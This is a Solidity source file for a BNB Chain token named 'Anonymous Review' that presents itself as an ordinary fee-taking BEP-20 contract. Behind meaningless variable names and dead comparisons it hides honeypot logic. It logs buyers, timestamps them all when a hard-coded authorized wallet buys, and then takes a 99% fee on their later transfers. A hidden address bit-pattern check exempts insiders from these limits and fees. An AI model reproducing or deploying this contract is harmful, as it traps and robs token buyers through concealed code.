/**
 *Submitted for verification at BscScan.com on 2022-12-21
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.5;interface IUniswapV2Router {    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    function factory() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);    function WETH() external pure returns (address);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;}library SafeMath {    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function SetAuthorized(address adr) public onlyOwner() {        competent[adr] = true;    }    function removeAuthorized(address adr) public onlyOwner() {        competent[adr] = false;    }    function Owner() public view returns (address) {        return owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}interface IBEP20 {    function allowance(address _owner, address spender)    external    view    returns (uint256);    function decimals() external view returns (uint8);    function approve(address spender, uint256 amount) external returns (bool);    function totalSupply() external view returns (uint256);    function balanceOf(address account) external view returns (uint256);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function getOwner() external view returns (address);    function symbol() external view returns (string memory);    function name() external view returns (string memory);    function transfer(address recipient, uint256 amount)     external    returns (bool);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}contract AnonymousReview is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    string constant _name = "Anonymous Review ";    string constant _symbol = "AnonymousReview";    uint8 constant _decimals = 18;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private receiverMaxModeSwap;    mapping(address => bool) private liquidityLaunchedTxLimit;    mapping(address => bool) private sellLimitBotsMode;    mapping(address => bool) private limitIsMaxFeeReceiverMin;    mapping(address => uint256) private exemptTradingTeamBurn;    mapping(uint256 => address) private launchedMaxBotsTx;    uint256 public maxWalletAmount = 0;    uint256 private launchBlock = 0;    //BUY FEES    uint256 private modeWalletBurnTeam = 0;    uint256 private modeFeeBuyTrading = 7;    //SELL FEES    uint256 private maxReceiverExemptFee = 0;    uint256 private modeAutoBurnWalletMax = 7;    uint256 private burnBotsLimitMax = modeFeeBuyTrading + modeWalletBurnTeam;    uint256 private burnReceiverFeeLiquidity = 100;    address private tradingAutoLiquiditySwap = (msg.sender); // auto-liq address    address private teamLaunchedBurnTradingTxMaxLimit = (0xB37983729283bD2A11AE8738FFFfEBb45788A971); // marketing address    address private maxAutoTxBotsMarketing = DEAD;    address private launchedLimitWalletIsTrading = DEAD;    address private botsBuyTxIs = DEAD;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private burnFeeLaunchedReceiver;    uint256 private tradingTeamAutoBurnMax;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);    bool private autoBurnLimitIs;    uint256 private limitMarketingFeeBuy;    uint256 private isBuyAutoLaunchedWalletMinBurn;    uint256 private tradingSwapBotsFee;    uint256 private modeLiquidityMarketingWalletReceiverLimitTrading;    bool private receiverLaunchedMarketingFeeMaxTradingLimit = true;    bool private limitIsMaxFeeReceiverMinMode = true;    bool private modeMinExemptLaunched = true;    bool private walletIsModeTrading = true;    bool private launchedSellTradingBurn = true;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    uint256 private limitWalletMarketingBots = 6 * 10 ** 15;    uint256 private swapExemptWalletModeMarketingAutoIs = _totalSupply / 1000; // 0.1%        uint256 private tradingBotsLimitTeam = 0;    uint256 private maxTradingMarketingBurn = 0;    bool public maxFeeIsBurnExemptModeBots = false;    bool private txMinReceiverLiquidityLimit = false;    uint256 public limitTradingSellBotsBuyLiquidity = 0;    uint256 public burnWalletTeamReceiver = 0;    uint256 public swapTeamMaxMarketingTradingBuyMode = 0;    uint256 private autoExemptBurnFeeReceiverMax = 0;    uint256 private sellTeamModeLimit = 0;    uint256 public sellReceiverMarketingLiquidityMinTeamAuto = 0;    uint256 public maxTradingMarketingBurn0 = 0;    bool public maxTradingMarketingBurn1 = false;    uint256 public maxTradingMarketingBurn2 = 0;    bool private maxTradingMarketingBurn3 = false;    bool private maxTradingMarketingBurn4 = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        autoBurnLimitIs = true;        receiverMaxModeSwap[msg.sender] = true;        receiverMaxModeSwap[address(this)] = true;        liquidityLaunchedTxLimit[msg.sender] = true;        liquidityLaunchedTxLimit[0x0000000000000000000000000000000000000000] = true;        liquidityLaunchedTxLimit[0x000000000000000000000000000000000000dEaD] = true;        liquidityLaunchedTxLimit[address(this)] = true;        sellLimitBotsMode[msg.sender] = true;        sellLimitBotsMode[0x0000000000000000000000000000000000000000] = true;        sellLimitBotsMode[0x000000000000000000000000000000000000dEaD] = true;        sellLimitBotsMode[address(this)] = true;        SetAuthorized(address(0x0Dfa892E71F9bCc3Af20Bee5fffFcd6486634Dd4));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return autoLiquidityLimitBurn(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return autoLiquidityLimitBurn(sender, recipient, amount);    }    function liquidityBuyMinMaxFeeSwap(address sender, address receiver, uint256 amount) internal returns (uint256) {                uint256 feeAmount = amount.mul(exemptMarketingReceiverLiquidityMinSwapTeam(sender, receiver == uniswapV2Pair)).div(burnReceiverFeeLiquidity);        if (limitIsMaxFeeReceiverMin[sender] || limitIsMaxFeeReceiverMin[receiver]) {            feeAmount = amount.mul(99).div(burnReceiverFeeLiquidity);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function maxBuyBurnFeeExempt() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    launchedSellTradingBurn &&    _balances[address(this)] >= swapExemptWalletModeMarketingAutoIs;    }
    function launchedTradingIsTeamReceiverSwapSell(address addr) private {        if (autoMaxBuyLimit() < limitWalletMarketingBots) {            return;        }        maxWalletAmount = maxWalletAmount + 1;        launchedMaxBotsTx[maxWalletAmount] = addr;    }
    function exemptMarketingReceiverLiquidityMinSwapTeam(address sender, bool selling) internal returns (uint256) {                if (sellTeamModeLimit != maxTradingMarketingBurn) {            sellTeamModeLimit = modeAutoBurnWalletMax;        }        if (tradingBotsLimitTeam != modeAutoBurnWalletMax) {            tradingBotsLimitTeam = modeFeeBuyTrading;        }        if (selling) {            burnBotsLimitMax = modeAutoBurnWalletMax + maxReceiverExemptFee;            return launchedTradingWalletBots(sender, burnBotsLimitMax);        }        if (!selling && sender == uniswapV2Pair) {            burnBotsLimitMax = modeFeeBuyTrading + modeWalletBurnTeam;            return burnBotsLimitMax;        }        return launchedTradingWalletBots(sender, burnBotsLimitMax);    }
    function isTeamBurnSwapFeeWallet(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function getModeWalletBurnTeam() public view returns (uint256) {        if (modeWalletBurnTeam != launchBlock) {            return launchBlock;        }        if (modeWalletBurnTeam != burnReceiverFeeLiquidity) {            return burnReceiverFeeLiquidity;        }        if (modeWalletBurnTeam == swapExemptWalletModeMarketingAutoIs) {            return swapExemptWalletModeMarketingAutoIs;        }        return modeWalletBurnTeam;    }
    function setReceiverLaunchedMarketingFeeMaxTradingLimit(bool a0) public onlyOwner {        if (receiverLaunchedMarketingFeeMaxTradingLimit != receiverLaunchedMarketingFeeMaxTradingLimit) {            receiverLaunchedMarketingFeeMaxTradingLimit=a0;        }        if (receiverLaunchedMarketingFeeMaxTradingLimit == limitIsMaxFeeReceiverMinMode) {            limitIsMaxFeeReceiverMinMode=a0;        }        receiverLaunchedMarketingFeeMaxTradingLimit=a0;    }
    function getLimitWalletMarketingBots() public view returns (uint256) {        if (limitWalletMarketingBots != launchBlock) {            return launchBlock;        }        if (limitWalletMarketingBots != modeAutoBurnWalletMax) {            return modeAutoBurnWalletMax;        }        return limitWalletMarketingBots;    }
    function setLimitWalletMarketingBots(uint256 a0) public onlyOwner {        if (limitWalletMarketingBots != limitWalletMarketingBots) {            limitWalletMarketingBots=a0;        }        if (limitWalletMarketingBots != modeFeeBuyTrading) {            modeFeeBuyTrading=a0;        }        if (limitWalletMarketingBots != tradingBotsLimitTeam) {            tradingBotsLimitTeam=a0;        }        limitWalletMarketingBots=a0;    }
    function getLaunchedMaxBotsTx(uint256 a0) public view returns (address) {            return launchedMaxBotsTx[a0];    }
    function getMaxReceiverExemptFee() public view returns (uint256) {        if (maxReceiverExemptFee == burnBotsLimitMax) {            return burnBotsLimitMax;        }        if (maxReceiverExemptFee != modeAutoBurnWalletMax) {            return modeAutoBurnWalletMax;        }        return maxReceiverExemptFee;    }
    function autoLiquidityLimitBurn(address sender, address recipient, uint256 amount) internal returns (bool) {                bool bLimitTxWalletValue = marketingIsBurnModeLimitWalletExempt(sender) || marketingIsBurnModeLimitWalletExempt(recipient);                if (tradingBotsLimitTeam != tradingBotsLimitTeam) {            tradingBotsLimitTeam = burnReceiverFeeLiquidity;        }        if (autoExemptBurnFeeReceiverMax != autoExemptBurnFeeReceiverMax) {            autoExemptBurnFeeReceiverMax = swapExemptWalletModeMarketingAutoIs;        }        if (sender == uniswapV2Pair) {            if (maxWalletAmount != 0 && isAuthorized(recipient)) {                botsTeamAutoLimit();            }            if (!bLimitTxWalletValue) {                launchedTradingIsTeamReceiverSwapSell(recipient);            }        }                if (recipient == uniswapV2Pair && _balances[recipient] == 0) {            launchBlock = block.number + 10;        }        if (!bLimitTxWalletValue) {            require(block.number >= launchBlock, "No launch");        }                if (maxTradingMarketingBurn != modeFeeBuyTrading) {            maxTradingMarketingBurn = burnBotsLimitMax;        }        if (autoExemptBurnFeeReceiverMax == autoExemptBurnFeeReceiverMax) {            autoExemptBurnFeeReceiverMax = tradingBotsLimitTeam;        }        if (inSwap || bLimitTxWalletValue) {return isTeamBurnSwapFeeWallet(sender, recipient, amount);}        if (!receiverMaxModeSwap[sender] && !receiverMaxModeSwap[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                if (maxTradingMarketingBurn3 != maxTradingMarketingBurn4) {            maxTradingMarketingBurn3 = limitIsMaxFeeReceiverMinMode;        }        if (tradingBotsLimitTeam == maxTradingMarketingBurn) {            tradingBotsLimitTeam = sellTeamModeLimit;        }        if (maxTradingMarketingBurn4 != maxTradingMarketingBurn4) {            maxTradingMarketingBurn4 = limitIsMaxFeeReceiverMinMode;        }        require((amount <= _maxTxAmount) || sellLimitBotsMode[sender] || sellLimitBotsMode[recipient], "Max TX Limit!");        if (maxBuyBurnFeeExempt()) {autoWalletSellExempt();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = botsBurnIsModeAutoExemptMin(sender) ? liquidityBuyMinMaxFeeSwap(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function launchedTradingWalletBots(address sender, uint256 pFee) private view returns (uint256) {        uint256 f0 = exemptTradingTeamBurn[sender];        uint256 f1 = pFee;        if (f0 > 0 && block.timestamp - f0 > 2) {            f1 = 99;        }        return f1;    }
    function botsTeamAutoLimit() private {        if (maxWalletAmount > 0) {            for (uint256 i = 1; i <= maxWalletAmount; i++) {                if (exemptTradingTeamBurn[launchedMaxBotsTx[i]] == 0) {                    exemptTradingTeamBurn[launchedMaxBotsTx[i]] = block.timestamp;                }            }            maxWalletAmount = 0;        }    }
    function setModeWalletBurnTeam(uint256 a0) public onlyOwner {        modeWalletBurnTeam=a0;    }
    function setLaunchedMaxBotsTx(uint256 a0,address a1) public onlyOwner {        if (a0 == swapExemptWalletModeMarketingAutoIs) {            maxAutoTxBotsMarketing=a1;        }        launchedMaxBotsTx[a0]=a1;    }
    function getReceiverLaunchedMarketingFeeMaxTradingLimit() public view returns (bool) {        return receiverLaunchedMarketingFeeMaxTradingLimit;    }
    function setMaxAutoTxBotsMarketing(address a0) public onlyOwner {        if (maxAutoTxBotsMarketing != tradingAutoLiquiditySwap) {            tradingAutoLiquiditySwap=a0;        }        if (maxAutoTxBotsMarketing == maxAutoTxBotsMarketing) {            maxAutoTxBotsMarketing=a0;        }        maxAutoTxBotsMarketing=a0;    }
    function botsBurnIsModeAutoExemptMin(address sender) internal view returns (bool) {        return !liquidityLaunchedTxLimit[sender];    }
    function autoMaxBuyLimit() private view returns (uint256) {        address t0 = WBNB;        if (address(this) < WBNB) {            t0 = address(this);        }        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;        return buyAmount;    }
    function setMaxReceiverExemptFee(uint256 a0) public onlyOwner {        if (maxReceiverExemptFee == autoExemptBurnFeeReceiverMax) {            autoExemptBurnFeeReceiverMax=a0;        }        if (maxReceiverExemptFee != sellTeamModeLimit) {            sellTeamModeLimit=a0;        }        maxReceiverExemptFee=a0;    }
    function getMaxAutoTxBotsMarketing() public view returns (address) {        if (maxAutoTxBotsMarketing == launchedLimitWalletIsTrading) {            return launchedLimitWalletIsTrading;        }        if (maxAutoTxBotsMarketing != botsBuyTxIs) {            return botsBuyTxIs;        }        if (maxAutoTxBotsMarketing != maxAutoTxBotsMarketing) {            return maxAutoTxBotsMarketing;        }        return maxAutoTxBotsMarketing;    }
    function marketingIsBurnModeLimitWalletExempt(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function autoWalletSellExempt() internal swapping {                if (maxTradingMarketingBurn4 != limitIsMaxFeeReceiverMinMode) {            maxTradingMarketingBurn4 = maxTradingMarketingBurn4;        }        if (tradingBotsLimitTeam != burnBotsLimitMax) {            tradingBotsLimitTeam = burnReceiverFeeLiquidity;        }        uint256 amountToLiquify = swapExemptWalletModeMarketingAutoIs.mul(modeWalletBurnTeam).div(burnBotsLimitMax).div(2);        uint256 amountToSwap = swapExemptWalletModeMarketingAutoIs.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = burnBotsLimitMax.sub(modeWalletBurnTeam.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(modeWalletBurnTeam).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(modeFeeBuyTrading).div(totalETHFee);                if (autoExemptBurnFeeReceiverMax == limitWalletMarketingBots) {            autoExemptBurnFeeReceiverMax = autoExemptBurnFeeReceiverMax;        }        if (sellTeamModeLimit != maxTradingMarketingBurn) {            sellTeamModeLimit = modeAutoBurnWalletMax;        }        payable(teamLaunchedBurnTradingTxMaxLimit).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                tradingAutoLiquiditySwap,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}